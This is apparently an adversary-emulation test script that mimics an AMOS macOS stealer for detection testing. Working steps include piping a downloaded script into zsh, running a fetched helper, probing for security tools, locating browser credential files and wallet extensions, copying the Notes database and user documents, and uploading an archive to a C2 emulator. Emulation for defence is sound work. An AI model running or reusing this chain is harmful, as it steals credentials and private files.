# description: AMOS-like macOS stealer chain — VM checks, collection staging, archive, simulated exfiltration
# host-http: yes
# actor: AMOS Stealer (Objective-See blog 0x88 behavioural emulation only)
# mitre: T1204.002, T1497.001, T1059.002, T1059.004, T1518.001, T1555.003, T1539, T1005, T1560.001, T1041, T1543.001
# reference: https://objective-see.org/blog/blog_0x88.html
# reference: https://attack.mitre.org/software/S1048/
# reference: https://attack.mitre.org/techniques/T1497/001/
# reference: https://attack.mitre.org/techniques/T1555/003/

bash <<'AMOS_CHAIN'
set +e
: "${ESGRAPH_RUN_ID:?ESGRAPH_RUN_ID is required}"
: "${ESGRAPH_HOST_HTTP:?ESGRAPH_HOST_HTTP is required}"

CHAIN="/tmp/amos_chain_${ESGRAPH_RUN_ID}"
HELPER="/tmp/amos_helper_${ESGRAPH_RUN_ID}"
ARCHIVE="/tmp/amos_archive_${ESGRAPH_RUN_ID}.tar.gz"
mkdir -p "${CHAIN}/exfil" "${CHAIN}/decoy" "${CHAIN}/enum"

# T1204.002 — ClickFix-style curl + base64 decode + shell delivery.
echo -n "${ESGRAPH_HOST_HTTP}/curl/stage1" | base64 > "${CHAIN}/enum/stage1-url.b64"
curl --connect-timeout 3 -m 5 -sS "${ESGRAPH_HOST_HTTP}/curl/stage1" 2>/dev/null | zsh -s
curl --connect-timeout 3 -m 5 -sS -o "${HELPER}" "${ESGRAPH_HOST_HTTP}/frozenfix/update" 2>/dev/null
chmod +x "${HELPER}" 2>/dev/null
"${HELPER}" 2>/dev/null

# T1497.001 — VM / sandbox detection via system_profiler (AMOS-style checks).
system_profiler SPMemoryDataType 2>/dev/null | head -120 > "${CHAIN}/enum/spmemory.txt"
system_profiler SPHardwareDataType 2>/dev/null | head -120 > "${CHAIN}/enum/sphardware.txt"
grep -E "QEMU|VMware|KVM|Intel Core 2|Chip: Unknown" "${CHAIN}/enum/spmemory.txt" "${CHAIN}/enum/sphardware.txt" 2>/dev/null > "${CHAIN}/enum/vm-indicators.txt"

# T1059.002 — AppleScript helper prompt (simulated; skip over non-interactive SSH).
if [[ -t 0 ]]; then
  osascript -e 'display dialog "ESGraph scenario: simulated System Helper Installation prompt" buttons {"Continue"} default button 1 with icon caution' 2>/dev/null &
  dialog_pid=$!
  ( sleep 10; kill "${dialog_pid}" 2>/dev/null ) &
  wait "${dialog_pid}" 2>/dev/null
fi

# T1518.001 / T1562.001 — probe for common macOS security tools (no kill -9).
{
  pgrep -l "Little Snitch" 2>/dev/null
  pgrep -l "BlockBlock" 2>/dev/null
  launchctl list 2>/dev/null | grep -i lulu
  killall -0 "Little Snitch" 2>/dev/null
} > "${CHAIN}/enum/security-tool-probe.txt" 2>&1

# T1555.003 / T1539 — enumerate browser profile paths targeted by AMOS.
{
  for p in "Google/Chrome" "BraveSoftware/Brave-Browser" "Microsoft Edge" "Opera Software" "Mozilla/Firefox"; do
    ls -la "$HOME/Library/Application Support/$p" 2>/dev/null | head -20
  done
} > "${CHAIN}/enum/browser-paths.txt" 2>&1
{
  for p in "Google/Chrome" "BraveSoftware/Brave-Browser"; do
    find "$HOME/Library/Application Support/$p" -maxdepth 4 -type f \( -name "Login Data" -o -name "Cookies" -o -name "Web Data" \) 2>/dev/null | head -20
  done
} > "${CHAIN}/enum/browser-artifacts.txt"

# T1555.003 — crypto wallet extension IDs (subset from blog; search Local Extension Settings).
cat > "${CHAIN}/enum/crypto-wallet-ids.txt" <<CRYPTO_IDS
nkbihfbeogaeaoehlefnkodbefgpgknn
bfnaelmomeimhlpmgjnjophhpkkoljpa
hnfanknocfeofbddgcijnmhnfnkdnaad
fhbohimaelbohpjbbldcngcnapndodjp
mcohilncbfahbmgdjkbpemcciiolgcge
CRYPTO_IDS
while read -r ext_id; do
  find "$HOME/Library/Application Support/Google/Chrome/Default/Local Extension Settings" -maxdepth 1 -type d -name "$ext_id" 2>/dev/null
done < "${CHAIN}/enum/crypto-wallet-ids.txt" | head -20 > "${CHAIN}/enum/wallet-extension-dirs.txt"

# T1005 — Apple Notes and document grabber staging (benign copies only).
NOTES_DB="$HOME/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite"
if [[ -f "$NOTES_DB" ]]; then
  cp "$NOTES_DB" "${CHAIN}/exfil/NoteStore.sqlite.copy" 2>/dev/null
else
  echo "notes-db-missing" > "${CHAIN}/exfil/notes-placeholder.txt"
fi
find "$HOME/Desktop" "$HOME/Documents" -maxdepth 2 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.doc" -o -name "*.docx" -o -name "*.key" \) 2>/dev/null | head -40 > "${CHAIN}/enum/document-candidates.txt"
while IFS= read -r f; do
  [[ -f "$f" && $(stat -f%z "$f" 2>/dev/null || echo 999999999) -le 1048576 ]] && cp "$f" "${CHAIN}/exfil/" 2>/dev/null
done < "${CHAIN}/enum/document-candidates.txt"

# T1555.001 — keychain access pattern (read-only probes; no password exfiltration).
security list-keychains 2>/dev/null > "${CHAIN}/enum/keychains.txt"
echo "security find-generic-password -ga Safari -w" > "${CHAIN}/enum/keychain-cmd-pattern.txt"

# AMOS staging directories (under scenario temp root, not real ~/.config / ~/.local).
mkdir -p "${CHAIN}/staging-config" "${CHAIN}/staging-local"
echo "scenario=amos_stealer_chain" > "${CHAIN}/staging-config/marker.txt"
echo "run=${ESGRAPH_RUN_ID}" > "${CHAIN}/staging-local/marker.txt"

# T1543.001 — decoy LaunchAgent plist (written to staging only; not loaded).
cat > "${CHAIN}/decoy/com.apple.mdworker.plist" <<PLIST_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>echo esgraph-amos-decoy</string>
    </array>
</dict>
</plist>
PLIST_EOF

# T1560.001 + T1041 — archive staged loot and upload to host C2 emulator.
tar -czf "${ARCHIVE}" -C "${CHAIN}" exfil enum decoy staging-config staging-local 2>/dev/null
if [[ -f "${ARCHIVE}" ]]; then
  curl --connect-timeout 3 -m 5 -sS -o /dev/null -X POST -F "file=@${ARCHIVE}" "${ESGRAPH_HOST_HTTP}/upload" 2>/dev/null
fi

ls -la "${CHAIN}" "${CHAIN}/exfil" "${CHAIN}/enum" "${CHAIN}/decoy" 2>/dev/null
AMOS_CHAIN
